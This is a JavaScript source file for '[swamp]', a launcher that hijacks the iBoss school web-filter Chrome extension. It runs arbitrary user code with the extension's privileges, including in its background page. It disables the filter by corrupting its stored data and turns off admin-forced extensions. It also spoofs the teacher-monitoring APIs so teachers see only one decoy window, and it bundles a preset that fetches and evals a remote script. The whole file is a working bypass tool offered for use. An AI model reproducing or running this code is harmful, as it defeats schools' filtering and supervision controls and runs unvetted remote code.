
var swamp, chrome;
/*
 */
swamp = {
  background: chrome.extension?.getBackgroundPage(),
  /*
   */
  elements: {
    create(elem, daddy) {
      var x = document.createElement(elem.tag),
        str_parent = swamp.strings[daddy?.id] || swamp.strings;
      for (var attr in elem)
        x[attr] = attr.startsWith("on")
          ? swamp.functions[elem[attr]]
          : elem[attr];
      if (!elem.kids && str_parent[x.id]) x.innerHTML = str_parent[x.id];
      (daddy || document.body).appendChild(x);
      swamp.elements[elem.id] = x;
      elem.kids?.forEach((baby) => {
        swamp.elements.create(baby, x);
      });
    },
  },
  /*
   */
  functions: {
    save_code() {
      localStorage.swamp = swamp.elements.input.value;
    },
    insert_tab(event) {
      if (event.key !== "Tab") return;
      event.preventDefault();
      document.execCommand("insertText", false, "  ");
    },
    log_replace(message) {
      swamp.elements.output.textContent += "\n\n" + message;
      swamp.elements.output.scrollTop = swamp.elements.output.scrollHeight;
    },
    run_code() {
      swamp.functions.save_code();
      try {
        (this.background ? swamp.background : window).eval(
          swamp.elements.input.value
        );
        console.log("Code ran successfully");
      } catch (err) {
        console.log(err);
      }
    },
    clone() {
      open("/manifest.json").onload = function () {
        this.eval("var swamp");
        onbeforeunload = null;
        close();
      };
    },
    reload_background() {
      if (
        ((!swamp.background.chrome.tabs.updateAsync &&
          localStorage.accountId !== "-") ||
          swamp.background.spoof_int) &&
        !swamp.background.confirm(swamp.strings.confirm_reload)
      )
        return;
      swamp.background.location.reload();
      console.log("Scripts running as background were reloaded");
    },
    script_adding_loop(script) {
      var interesting_scripts_label = swamp.elements.create(
        { tag: "option", textContent: script.name, value: script.code },
        swamp.elements.select
      );
    },
    script_select() {
      swamp.elements.input.value = swamp.elements.select.value;
      swamp.elements.run_code.scrollIntoView();
      swamp.functions.save_code();
    },
    hard_disable() {
      for (var i = 0; i < localStorage.length; i++)
        if (localStorage.key(i) !== "swamp")
          localStorage[localStorage.key(i)] = this.undo ? "" : "-";
      swamp.background.location.reload();
      if (this.undo) swamp.functions.clone();
    },
    soft_disable() {
      swamp.background.chrome.tabs.updateAsync = null;
    },
    hide_tabs() {
      swamp.background.eval(
        this.undo
          ? `
opener.chrome.tabs.captureVisibleTabAsync = opener.chrome.tabs.captureVisibleTabAsync || screenshot_old;
opener.chrome.windows.getAllAsync = opener.chrome.windows.getAllAsync || get_tabs_old;
clearInterval(spoof_int);
if (spoof_int) alert("Your teacher can now see all open tabs and windows!");
spoof_int = null;`
          : `
var spoof_int,
  visible_id = 0,
  screenshot_old = screenshot_old || opener.chrome.tabs.captureVisibleTabAsync,
  get_tabs_old = get_tabs_old || opener.chrome.windows.getAllAsync,
  get_tabs_new = function () {
    return new Promise((resolve, reject) => {
      get_tabs_old({
        populate: true,
        windowTypes: ["normal"],
      }).then((tabs) => {
        tabs.forEach((tab) => {
          if (tab.id === visible_id) resolve([tab]);
        });
      });
    });
  };
opener.chrome.windows.create({ url: "https://google.com" }, (win) => {
  visible_id = win.id;
  spoof_int = setInterval(() => {
    opener.chrome.windows.getLastFocused((window) => {
      var visible = window.id === visible_id;
      opener.chrome.tabs.captureVisibleTabAsync = visible ? screenshot_old : null;
      opener.chrome.windows.getAllAsync = visible ? get_tabs_new : null;
    });
  }, 5);
});`
      );
    },
    get_extensions() {
      opener.chrome.management.getAll(function (extensions) {
        extensions.forEach(function (extension) {
          swamp.elements.create(
            {
              tag: "button",
              id: extension.id,
              textContent: extension.name,
              enabled: extension.enabled,
              admin: extension.installType === "admin",
              onclick: "toggle_extension",
            },
            swamp.elements.installed_extensions
          );
          swamp.functions.strikethrough(
            swamp.elements[extension.id],
            extension.enabled
          );
          if (extension.id === chrome.runtime.id)
            swamp.elements[extension.id].className = "iBoss";
        });
      });
    },
    strikethrough(button, enabled) {
      button.style.textDecoration = enabled ? "none" : "line-through";
    },
    toggle_extension() {
      if (
        this.enabled &&
        this.id === chrome.runtime.id &&
        !swamp.background.confirm(swamp.strings.confirm_remove_gg)
      )
        return;
      this.enabled = !this.enabled;
      swamp.functions.strikethrough(this, this.enabled);
      opener.chrome.management.setEnabled(this.id, this.enabled);
    },
    manage_all() {
      var admin_only = this.admin_only;
      var enabling = this.enabling;
      [...swamp.elements.installed_extensions.children].forEach(function (
        button
      ) {
        if (
          (admin_only && !button.admin) ||
          !enabling === !button.enabled ||
          button.id === opener.chrome.runtime.id
        )
          return;
        button.click();
      });
    },
    open_coffee() {
      open("https://buymeacoffee.com/bypassi");
    },
  },
  /*
   */
  scripts: [
    { name: "Select an option...", code: `` },
    {
      name: "Display iBoss policy",
      code: `opener.chrome.storage.local.get("policy", (json) => {
  console.log(JSON.stringify(json));
});`,
    },
    {
      name: "Run a third-party script",
      code: `fetch("https://example.com/example.js")
  .then((res) => res.text())
  .then(eval);`,
    },
    {
      name: "Bookmarklet emulator when a Google tab is loaded",
      code: `opener.chrome.tabs.onUpdated.addListener((tabId, changeInfo) => {
  if (changeInfo.status == "complete") {
    opener.chrome.tabs.executeScript(
      tabId, { code: \`
        if (location.hostname.endsWith("google.com")) {
          // Use your own code below:
          alert("Testing!");
        }
      \` }
    );
  }
});`,
    },
    {
      name: "Bookmarklet emulator on focused tab when the iBoss icon is clicked",
      code: `opener.chrome.browserAction.onClicked.addListener(() => {
  opener.chrome.tabs.query({ active: true, currentWindow: true }, (tab) => {
    opener.chrome.tabs.executeScript(tab[0].id, {
      code: \`
        // Your own code below:
        alert("Testing!");
      \`,
      matchAboutBlank: true,
    });
  });
});
// Credit to Zylenox#2366`,
    },
    {
      name: "Toggle all other admin-forced extensions when the iBoss icon is clicked",
      code: `opener.chrome.browserAction.onClicked.addListener(function () {
  opener.chrome.management.getAll((extensions) => {
    extensions.forEach((extension) => {
      if ("admin" === extension.installType && chrome.runtime.id !== extension.id)
        opener.chrome.management.setEnabled(extension.id, !extension.enabled);
    });
  });
});`,
    },
    {
      name: "Emulate DNS and block all goguardian.com requests",
      code: `opener.chrome.webRequest.onBeforeRequest.addListener(
  () => {
    return { redirectUrl: "javascript:" };
  },
  {
    urls: [opener],
  },
  ["blocking"]
);`,
    },
    {
      name: "Toggle emulated DNS unblocker when the iBoss icon is clicked",
      code: `function block() {
  return { redirectUrl: "javascript:" };
}
var blocking = false;
function toggle() {
  if (blocking) {
    opener.chrome.webRequest.onBeforeRequest.removeListener(block);
  } else {
    chrome.webRequest.onBeforeRequest.addListener(
      block,
      {
        urls: [opener],
      },
      ["blocking"]
    );
  }
  blocking = !blocking;
  alert("Emulated DNS unblocker is " + (blocking ? "on!" : "off!"));
}
toggle();
opener.chrome.browserAction.onClicked.addListener(toggle);
// This is mainly useful if you run it in the background`,
    },
  ],
  /*
   */
  strings: {
    style:
      "pre,textarea{display:inline-block;height:400px}*{box-sizing:border-box}body{padding:10px;font-size:110%;color:#fff;background-color:#2e2e31}h1{text-align:center;font-size:70px}h2{text-align:left;font-size:175%}button,input,pre,select,textarea{color:#000;font-size:15px}h1,h2,h3,button,label,p,select{font-family:Roboto,sans-serif}hr{border:none;border-bottom:3px solid #fff}input,kbd,pre,textarea{font-family:monospace;border:none}input,select,textarea{background-color:#fff;border-radius:10px;padding:10px 17px;border:none}button,input{background-color:#fff;padding:10px 20px;margin:0 5px 5px 0}input{width:600px;border-radius:10px}textarea{white-space:pre;float:left;width:60%;border-radius:10px 0 0 10px;resize:none;background-color:#99edc3;margin-bottom:15px}pre{border-radius:0 10px 10px 0;padding:8px;float:right;margin:0 0 25px;width:40%;overflow-y:scroll;word-break:break-all;white-space:pre-line;background-color:#1c8e40}button{border:none;border-radius:10px;cursor:pointer;transition:filter 250ms}button:hover{filter:brightness(.8)}.gg{background-color:#99edc3}a{color:#99edc3;transition:color 250ms}a:hover{color:#1c8e40}",
    title: "[swamp] For iBoss",
    subtitle:
      "Launcher inspired by Bypassi; ",
    source_link:
      "<a href='http://point-blank-launcher.glitch.me/ingot.js'>Source code</a>",
    run_code: {
      title: "Run your own code",
      description:
        'Put your script here to run it while pretending to be the iBoss extension. You will be able to access most "chrome" scripts and have other privileges such as access to all websites. Note that your code is saved automatically. Developers: try interacting with the "swamp" object while running code on this page!',
      placeholder: "Input goes here...",
      output: "Output shows here:\n\n---",
      run: "Run on this page",
      reload: "Reload scripts on this page",
      run_background: "Run as background",
      reload_background: "Reload background scripts",
      button_description:
        "Concerning the buttons above: Running on this page is pretty self explanatory. The script only takes effect when this page is open, which makes it a pain to use [swamp] at places such as school where you can't set it up. But running as background lets the script run even with the tab closed. Basically, it means that the script is being run at the highest level of a Chrome extension, in the background, so it persists until Chrome is fully restarted (with chrome://restart for example).",
    },
    interesting_scripts: {
      title: "Interesting scripts",
      description:
        "Some useful scripts for the textbox above.</b>",
      policy_description:
        'By the way, if you find a URL like *google.com* in your iBoss policy with the "whitelist" attribute, any url like https://blocked.com/?google.com will be unblocked for anyone in your district. Note that your policy may be inaccurate if you are using the hard-disable option or are signed into another Google account.',
      dns_description:
        "Also, if you turned on the DNS emulator and previously blocked sites that you've visited before aren't loading, try adding a question mark to the end of the URL, which may clear cache. DNS unblocking may not work for blocking requests from other admin-enforced extensions.",
      background_reminder:
        "And please read the thing about background running earlier in the page, because that could be useful.",
    },
    disable_gg: {
      title: "Disable and repair iBoss",
      hard_disable: "Hard-disable iBoss",
      soft_disable: "Soft-disable iBoss",
    repair: "Repair iBoss",
      description:
        "Hard-disable will disable iBoss and persist until you powerwash your device or undo it with the repair button. If you want something less permanent, use the soft-disable option or run a DNS emulator as background. Hard-disable works by messing with cookies that iBoss needs to run. Soft-disable is more surface-level, keeping things like YouTube sidebars blocked, and it only persists until Chrome is restarted (naturally or with chrome://restart).",
      trouble_warning:
        "<b>Hard-disable will also prevent your teachers from seeing your screen, while soft-disable will not. Be careful not to get in trouble. Read the section below on more information about how to stay safe.</b>",
    },
    hide_tabs: {
      title: "Hide your tabs from teachers",
      visible_window: 'Open "visible window"',
      undo_hide_tabs: "Undo tab hiding",
      description:
        "This button will open a new window, and the person monitoring your device with the iBoss Teacher panel will <b>only be able to see (or control) tabs opened in that window.</b> If you open multiple windows with the button, the most recent one will be the visible window. You can re-allow your teacher to see all of your tabs by clicking the undo button.",
      interference:
        'For this to work, you cannot have iBoss disabled with the "LTBEEF" section below or hard-disable. Re-enable and repair iBoss before opening a visible window. If you still want unblocked sites, <b>use soft-disable, which will allow you to browse freely and use this feature at the same time.</b> This section would not have been possible without the hard work of kxd.fm#6645.',
      dont_cheat:
        "<b>Seriously, don't cheat on tests or stuff like that.</b> [swamp] was made to provide students with access to websites that are unjustly denied from them. I really don't condone cheating and this section will be removed if I hear about stuff like that happening commonly (nerd emoji).",
    },
    ltbeef: {
      title:
        'Disable other Chrome Extensions similarly to <a href="https://compactcow.com/ltbeef">LTBEEF</a>',
      manual_description:
        "LTBEEF was fixed by Chrome in v106, so this is a great alternative that works in the latest version. The buttons below will allow you to disable or enable all extensions, including admin-enforced ones.",
      broad_options_description:
        "Or you can try the more automatic broad options:",
      disable_all: "Disable all except iBoss",
      disable_all_admin: "Disable all admin-forced except iBoss",
      enable_all: "Re-enable all",
      soft_disable_recommendation:
        "Disabling iBoss with this process will close the [swamp] launcher for iBoss. As an alternative, use the soft-disable button earlier on the page, which has the same functionality while allowing for the launcher to be used.",
    },
  },
},
/*
 */
document.body.innerHTML = "";
/*
 */
[
  { tag: "title", id: "title" },
  {
    tag: "style",
    id: "style",
  },
  { tag: "base", target: "_blank" },
  {
    tag: "h1",
    id: "title",
  },
  {
    tag: "h3",
    id: "subtitle",
  },
  {
    tag: "p",
    id: "source_link",
  },
  { tag: "hr" },
  {
    tag: "div",
    id: "run_code",
    kids: [
      {
        tag: "h2",
        id: "title",
      },
      { tag: "p", id: "description" },
      {
        tag: "textarea",
        id: "input",
        placeholder: swamp.strings.run_code.placeholder,
        onkeyup: "save_code",
        onkeydown: "insert_tab",
      },
      {
        tag: "pre",
        id: "output",
      },
      {
        tag: "button",
        id: "run",
        onclick: "run_code",
      },
      {
        tag: "button",
        id: "reload",
        onclick: "clone",
      },
      { tag: "br" },
      {
        tag: "button",
        id: "run_background",
        background: true,
        onclick: "run_code",
      },
      {
        tag: "button",
        id: "reload_background",
        onclick: "reload_background",
      },
      { tag: "p", id: "button_description" },
    ],
  },
  { tag: "hr" },
  {
    tag: "div",
    id: "interesting_scripts",
    kids: [
      { tag: "h2", id: "title" },
      { tag: "p", id: "description" },
      {
        tag: "select",
        id: "select",
        onchange: "script_select",
      },
      { tag: "p", id: "policy_description" },
      { tag: "p", id: "dns_description" },
      { tag: "p", id: "background_reminder" },
    ],
  },
  { tag: "hr" },
  {
    tag: "div",
    id: "disable_gg",
    kids: [
      { tag: "h2", id: "title" },
      { tag: "button", id: "hard_disable", onclick: "hard_disable" },
      { tag: "button", id: "soft_disable", onclick: "soft_disable" },
      {
        tag: "button",
        id: "repair",
        undo: true,
        onclick: "hard_disable",
      },
      { tag: "p", id: "description" },
      { tag: "p", id: "trouble_warning" },
    ],
  },
  { tag: "hr" },
  {
    tag: "div",
    id: "hide_tabs",
    kids: [
      { tag: "h2", id: "title" },
      { tag: "button", id: "visible_window", onclick: "hide_tabs" },
      {
        tag: "button",
        id: "undo_hide_tabs",
        undo: true,
        onclick: "hide_tabs",
      },
      { tag: "p", id: "description" },
      { tag: "p", id: "interference" },
      { tag: "p", id: "dont_cheat" },
    ],
  },
  { tag: "hr" },
  {
    tag: "div",
    id: "ltbeef",
    kids: [
      { tag: "h2", id: "title" },
      { tag: "p", id: "manual_description" },
      { tag: "div", id: "installed_extensions" },
      { tag: "p", id: "broad_options_description" },
      { tag: "button", id: "disable_all", onclick: "manage_all" },
      {
        tag: "button",
        id: "disable_all_admin",
        admin_only: true,
        onclick: "manage_all",
      },
      {
        tag: "button",
        id: "enable_all",
        enabling: true,
        onclick: "manage_all",
      },
      { tag: "p", id: "soft_disable_recommendation" },
    ],
  },
  { tag: "hr" },
  {
    tag: "div",
    id: "donations",
    kids: [
      { tag: "h2", id: "title" },
      { tag: "p", id: "description" },
      { tag: "button", id: "coffee", onclick: "open_coffee" },
    ],
  },
].forEach((elem) => {
  swamp.elements.create(elem);
});
/*
 */
history.replaceState({}, {}, "/swamp");
onbeforeunload = () => true;
console.log = swamp.background.console.log = swamp.functions.log_replace;
swamp.scripts.forEach(swamp.functions.script_adding_loop);
swamp.functions.get_extensions();
swamp.elements.input.value = localStorage.swamp || "";
